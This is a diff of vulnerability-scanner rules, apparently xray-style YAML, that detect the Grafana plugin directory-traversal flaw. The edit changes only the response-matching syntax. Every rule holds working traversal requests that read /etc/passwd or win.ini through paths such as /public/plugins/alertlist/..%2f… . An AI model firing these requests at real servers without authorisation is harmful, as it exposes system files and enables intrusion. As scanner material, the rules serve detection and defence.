@@ -81,7 +81,7 @@ rules:
             method: GET
             path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
 expression: |
     r0()
 detail:
@@ -109,42 +109,42 @@ rules:
             method: GET
             path: /public/plugins/alertlist..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r2:
         request:
             cache: true
             method: GET
             path: /public/plugins/annolist..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r3:
         request:
             cache: true
             method: GET
             path: /public/plugins/grafana-azure-monitor-datasource..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r4:
         request:
             cache: true
             method: GET
             path: /public/plugins/barchart..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r5:
         request:
             cache: true
             method: GET
             path: /public/plugins/bargauge..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r6:
         request:
             cache: true
             method: GET
             path: /public/plugins/cloudwatch..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r7: 
       ....
 expression: |
@@ -167,49 +167,49 @@ rules:
             method: GET
             path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r1:
         request:
             cache: true
             method: GET
             path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
         expression: |
-            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+            response.status == 200 && response.body_string.contains("for 16-bit app support")
     r2:
         request:
             cache: true
             method: GET
             path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r3:
         request:
             cache: true
             method: GET
             path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
         expression: |
-            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+            response.status == 200 && response.body_string.contains("for 16-bit app support")
     r4:
         request:
             cache: true
             method: GET
             path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r5:
         request:
             cache: true
             method: GET
             path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
         expression: |
-            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+            response.status == 200 && response.body_string.contains("for 16-bit app support")
     r6:
         request:
             cache: true
             method: GET
             path: /public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r7:
         ...
 expression: |
@@ -233,56 +233,56 @@ rules:
             path: /
             follow_redirects: true
         expression: |
-            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".bmatches(response.body) || response.body.bcontains(b"Sometimes restarting grafana-server can help")
+            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".matches(response.body_string) || response.body_string.contains("Sometimes restarting grafana-server can help")
     r0:
         request:
             cache: true
             method: GET
             path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r1:
         request:
             cache: true
             method: GET
             path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
         expression: |
-            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+            response.status == 200 && response.body_string.contains("for 16-bit app support")
     r2:
         request:
             cache: true
             method: GET
             path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r3:
         request:
             cache: true
             method: GET
             path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
         expression: |
-            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+            response.status == 200 && response.body_string.contains("for 16-bit app support")
     r4:
         request:
             cache: true
             method: GET
             path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r5:
         request:
             cache: true
             method: GET
             path: /public/plugins/grafana-azure-monitor-datasource/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
         expression: |
-            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+            response.status == 200 && response.body_string.contains("for 16-bit app support")
     r6:
         request:
             cache: true
             method: GET
             path: /public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
         expression: |
-            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
     r7:
         ...
 expression: |
@@ -350,13 +350,13 @@ rules:
             path: /
             follow_redirects: true
         expression: |
-            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".bmatches(response.body) || response.body.bcontains(b"Sometimes restarting grafana-server can help")
+            response.status == 200 && "window.grafana[b|B]oot[d|D]ata\\s*=\\s*{".matches(response.body_string) || response.body_string.contains("Sometimes restarting grafana-server can help")
     r0:
         request:
             method: GET
             path: /public/plugins/{{plugin}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{{file}}
         expression: |
-            response.status == 200 && re.bmatches(response.body)
+            response.status == 200 && re.matches(response.body_string)
 expression: detect() && r0()
 detail:
     author: test
